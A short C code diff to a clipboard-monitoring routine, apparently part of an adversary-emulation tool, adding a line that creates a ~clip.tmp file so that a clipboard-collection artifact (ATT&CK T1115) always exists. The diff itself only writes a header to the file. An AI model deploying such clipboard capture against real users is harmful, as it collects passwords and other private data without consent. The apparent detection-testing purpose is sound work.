@@ -425,6 +425,11 @@ static void MonitorClipboard(void) {
 
     LogMessage(L"[+] Clipboard monitoring started");
 
+    // ponytail: always touch the file at start so the T1115 artifact exists
+    // even when the clipboard is empty. AppendToFile uses OPEN_ALWAYS, so this
+    // creates ~clip.tmp if missing. Captured clips (if any) get appended below.
+    AppendToFile(CLIP_PATH, "=== Clipboard monitor session ===\r\n");
+
     for (int i = 0; i < 6; i++) {
         Sleep(5000);
 
